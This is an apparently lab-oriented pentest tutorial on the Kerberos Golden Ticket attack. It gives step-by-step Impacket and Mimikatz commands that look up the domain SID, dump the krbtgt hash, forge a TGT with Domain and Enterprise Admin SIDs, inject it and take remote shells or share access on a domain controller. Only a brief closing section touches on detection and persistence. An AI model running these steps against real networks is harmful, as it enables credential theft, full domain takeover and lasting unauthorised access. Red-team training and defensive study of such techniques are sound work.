A **Golden Ticket** attack allows an attacker to forge Kerberos **Ticket Granting Tickets (TGTs)** by using the **krbtgt account hash** of a domain.  
With this forged TGT, the attacker can impersonate **any user (including Domain Admins)** and obtain unrestricted access to domain resources.

---

## Requirements

- **krbtgt account hash** (NTLM/RC4 or AES key) and the **domain SID**.
- A tool to forge and inject Kerberos tickets (e.g., **Mimikatz**, **Impacket**).
- Access to a system inside the domain or a system that can use Kerberos authentication.

---


## Using Impacket (Linux/Kali)

### Step 1: Extract the necessary information 

First, you need to extract the Domain SID:

```bash
impacket-lookupsid <domain_name>/<user_name>:'Password123!'@<complete_domain_controller_name>
```
The output will list SIDs for users and groups. The **Domain SID** is the common prefix (e.g. `S-1-5-21-3754860944-83624914-1883974761`). The last number in each SID is the **RID** (Relative ID) of that user or group.

- Example: `...-500` = Administrator, `...-512` = Domain Admins.

### Step 2: Generate a Golden Ticket
Once you have the Domain SID, you can create a forged Kerberos ticket with `impacket-ticketer`. 

- `-user-id <RID>` → the RID of the user you want to impersonate. (e.g. `500` for Domain Admins)
- `-groups <RID>` → RIDs of groups you want to include (e.g. `512` for Domain Admins).
- `-extra-sid <SID>` → full SIDs of additional groups if you want to simulate Enterprise Admins or other privileges.
- `-aesKey` or `-nthash`. The AES key is preferred in modern Kerberos.
- `-extra-sid ...-512` → injects Parent Domain Admins.
- `S-1-5-9` → Enterprise Domain Controllers SID.
- `user` -> The user you want to impersonate.

```bash
impacket-ticketer -domain child.warfare.corp \
  -aesKey <krbtgt_AES_key> \
  -domain-sid S-1-5-21-3754860944-83624914-1883974761 \
  -user-id 500 -groups 512 \
  -extra-sid S-1-5-21-3375883379-808943238-3239386119-512,S-1-5-9 \
  Administrator
```

This will generate a Kerberos ticket cache (`<username>.ccache`) for the specified user.

### Step 3: Export the Ticket

Set the Kerberos ticket as the active credential:

```bash
export KRB5CCNAME=/path/to/Administrator.ccache
```

### Step 4: Use the Ticket

Leverage the Kerberos ticket to authenticate to services (no password required). For example:
```bash
impacket-psexec -k -no-pass <domain>/<username>@<target_ip>
```
- `-k` tells Impacket to use the Kerberos ticket stored in the `KRB5CCNAME` environment variable.


---


## Using Mimikatz (.kirbi ticket injection)

### Step 1: Dump the krbtgt Hash

On a compromised Domain Controller or system with domain admin privileges:
```bash
mimikatz.exe
lsadump::lsa /inject /name:krbtgt
```

- Extract the **RC4/NTLM hash** of the krbtgt account.
- Note the **Domain SID**.

### Step 2: Create the Golden Ticket
```bash
kerberos::golden /domain:<domain_name> /sid:<domain_SID> /rc4:<krbtgt_NTLM_hash> /user:<username> /ticket:golden.kirbi
```

- The `/user:` can be any user (e.g., `Administrator`), even if it does not exist.

### Step 3: Transfer and Inject the Ticket

- Transfer the generated `golden.kirbi` file to the attack machine.
- Inject the ticket:
```bash
mimikatz.exe
kerberos::ptt golden.kirbi
exit
```

### Step 4: Use the Forged Ticket

- With the ticket loaded in memory, access privileged resources:
```bash
dir \\<domain_controller>\c$
```
- You now have domain-wide access as the chosen user.




---

## Key Considerations

- **Persistence:**  
    Golden Tickets remain valid until the krbtgt password is reset **twice**.
    
- **Detection:**  
    Monitoring for unusual TGT lifetimes, anomalous logins, or unexpected Kerberos activity can help detect forged tickets.
    
- **Privilege:**  
    Full domain compromise is usually required to obtain the krbtgt hash (e.g., from a Domain Controller).
